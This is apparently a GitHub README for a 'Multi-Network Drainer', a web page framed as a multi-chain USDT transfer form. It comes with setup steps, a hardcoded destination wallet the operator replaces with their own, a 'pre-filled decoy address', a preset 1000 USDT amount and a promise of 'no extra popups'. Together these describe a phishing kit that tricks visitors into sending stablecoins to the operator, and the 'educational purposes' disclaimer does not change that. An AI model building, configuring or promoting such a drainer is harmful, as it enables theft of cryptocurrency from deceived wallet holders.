🌐  Multi‑Network Drainer
Made by MR.NIGHT
GitHub: Xepel

📖 Overview
This is a clean, lightweight web interface for transferring USDT across multiple blockchain networks.
It connects directly to your wallet (via MetaMask or any Web3 provider) and lets you choose the destination network with a simple dropdown – BNB Smart Chain, Ethereum, Polygon, or Arbitrum.

The form is designed to be fast, responsive, and borderless, with a minimal flat UI that integrates smoothly into any project.

✨ Features
Multi‑Network Support – BSC, Ethereum, Polygon, Arbitrum (easily extendable).

Live Network Switching – the selected network icon updates instantly.

Pre‑filled Decoy Address – a sample recipient address is shown by default (you can change it).

Max Button – quickly set the amount to a preset value (1000 USDT).

USD Conversion Hint – shows the approximate dollar value as you type.

No Extra Popups – the transaction is sent directly after clicking Next (your wallet will confirm).

Full‑Screen, Borderless Design – no card shadows, no rounded corners – just pure functionality.

🚀 Getting Started
1. Clone the Repository
bash
git clone https://github.com/xepel/usdt-multi-transfer.git
cd usdt-multi-transfer
2. Open the HTML File
Simply open index.html in your browser (Chrome / Brave / MetaMask‑enabled browser recommended).

3. Connect Your Wallet
Click Next – the app will automatically request wallet connection and network switch (if needed).

Confirm the transaction in your wallet.

⚙️ Configuration
Changing the Destination Address
The hardcoded destination wallet (where USDT is sent) is set in the JavaScript:

javascript
const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
Replace this with your own wallet address.

Adding / Removing Networks
Edit the NETWORKS array in the <script> section. Each entry requires:

javascript
{
  name: 'Network Name',
  chainId: '0x...',         // Hexadecimal chain ID
  rpc: 'https://...',       // RPC endpoint
  usdt: '0x...',            // USDT contract address
  nativeCurrency: { ... },  // Native token details
  explorer: 'https://...',  // Block explorer URL
  icon: 'https://...'       // Logo URL (displayed in the dropdown)
}
Then update the <select> options accordingly.

📂 File Structure
text
.
├── index.html          # Main HTML file (contains all CSS & JS)
└── README.md           # This file
🖼️ Network Icons
The dropdown uses the following image URLs (you can replace them with your own):

Network	Icon URL
BNB	https://s2.coinmarketcap.com/static/img/coins/200x200/1839.png
Ethereum	https://i.ibb.co/d4YXK0xS/eth.png
Polygon	https://forum.polygon.technology/uploads/default/original/2X/e/e8a...
Arbitrum	https://i.ibb.co/B5LyXDyf/c435b7f5f59449eeab220fb455e8c318.webp
⚠️ Disclaimer
This tool is intended for educational purposes and as a template for multi‑chain USDT transfers.
Always double‑check the destination address before signing any transaction.
The author is not responsible for any loss of funds due to misuse or misconfiguration.

🛠️ Built With
ethers.js – for blockchain interaction

Vanilla CSS + JavaScript – no frameworks, no dependencies

📬 Contact
MR.NIGHT – nexaq1

📄 License
MIT License – feel free to use and modify.

Made with ❤️ by MR.NIGHT
